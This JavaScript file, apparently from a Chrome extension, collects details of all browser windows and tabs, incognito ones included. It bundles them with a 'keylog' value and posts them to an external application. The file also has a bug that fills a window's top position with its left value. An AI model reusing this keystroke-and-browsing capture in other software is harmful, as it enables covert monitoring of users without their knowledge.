/* 
Windows class, to enable the collection of classes. Reduced in size with respect to the one that chrome uses

windows = { 
	winlist: [					<- A list of windows elements
		id  						<- An unique ID for the window
		focused						<- If the window is focused
		geometry : {				<- the position and the dimension for the window
			top
			left
			width
			height
		}
		ingognito					<- true if it is incognito
		type						<- type of the window, normal, or popup. Apps and panel are discarded!
		onTop						<- if it is set to be always on top
		tabs : [					<- a list of tabs
			index						<- ordered index of the tab from left to right
			active						<- if tab is active in his window
			pinned						<- if tab is pinned
			highlighted					<- if tab is highlighted
			title (short)				<- title of the tab
			url (short)					<- url of the tab
			status						<- complete or loading??
		]
	]
}

*/

var __Windows = function() {

	this.winlist = [];

	// This function refreshes the status of the windows structure that we use
	this.exec = function(keylogin) {
		var __winlist = [];

		chrome.windows.getAll({populate: true}, function(windows) {
			for(i = 0; i < windows.length; i++) {
				if ((windows[i].type == "normal") || (windows[i].type == "popup")) {
					// Works with the tabs contained in each window
					var __tablist = [];
					
					for (j = 0; j < windows[i].tabs.length; j++) {
						var __title = "";
						var __url = "";
						// Shortens the title if greater than 25 char
						if (windows[i].tabs[j].title.length > 25) {
							__title = windows[i].tabs[j].title.slice(0,22) + "...";
						} else {
							__title = windows[i].tabs[j].title;
						}
						// Shortens the url if greater than 25 char
						if (windows[i].tabs[j].url.length > 25) {
							__url = windows[i].tabs[j].url.slice(0,22) + "...";
						} else {
							__url = windows[i].tabs[j].url;
						}

						__tablist.push({
							index       : windows[i].tabs[j].index.toString(),
							active      : (windows[i].tabs[j].active ? true : false),
							pinned      : (windows[i].tabs[j].pinned ? true : false), 
							highlighted : (windows[i].tabs[j].highlighted ? true : false),
							title       : __title.toString(),
							url         : __url.toString(),
							status		:  windows[i].tabs[j].status.toString()
						});
					}

					// Add elements to the winlist
					__winlist.push({
						id          : windows[i].id.toString(),
						focused     : (windows[i].focused ? true : false),
						geometry    : { top : windows[i].left.toString(), left : windows[i].left.toString(), width : windows[i].width.toString(), height : windows[i].height.toString() },
						incognito   : (windows[i].incognito ? true : false),
						type        : windows[i].type.toString(),
						alwaysOnTop : (windows[i].alwaysOnTop ? true : false),
						tabs        : __tablist
					});
				}
			}
			connectExternalApp("event");
        	console.log({ "keylog": keylogin, "windows": __winlist});
	        port.postMessage({
	            protocol: "event",
	            content: { "keylog": keylogin, "windows": __winlist}
	        });
		});
		this.winlist =  __winlist;		
	};
}